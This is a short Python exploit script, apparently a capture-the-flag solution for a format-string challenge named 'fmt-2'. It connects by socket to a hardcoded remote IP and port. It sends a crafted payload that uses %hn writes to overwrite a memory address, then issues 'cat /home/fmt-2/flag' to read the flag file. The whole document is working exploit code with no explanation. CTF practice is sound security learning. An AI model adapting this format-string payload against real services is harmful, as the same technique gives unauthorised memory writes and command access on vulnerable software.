import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 4003

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None, decode=False):
  # TODO
  res = s.recv(100000)
  print(f'[<] {info if info else ""}')
  print(res if decode == False else res.decode('ascii'))
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

magic_adr = 0x404050

payload  = b'%45068c%10$hn' + b' '*3
payload += b'%19135c%11$hn' + b' '*3

payload += (magic_adr).to_bytes(8, 'little')
payload += (magic_adr+2).to_bytes(8, 'little')

recv()
send(payload)
recv()

send(b'cat /home/fmt-2/flag')
r = recv()
while b'FLAG' not in r:
  r = recv()

flag = r[r.find(b'FLAG'):r.find(b'}')+1].decode('ascii')
print(flag)
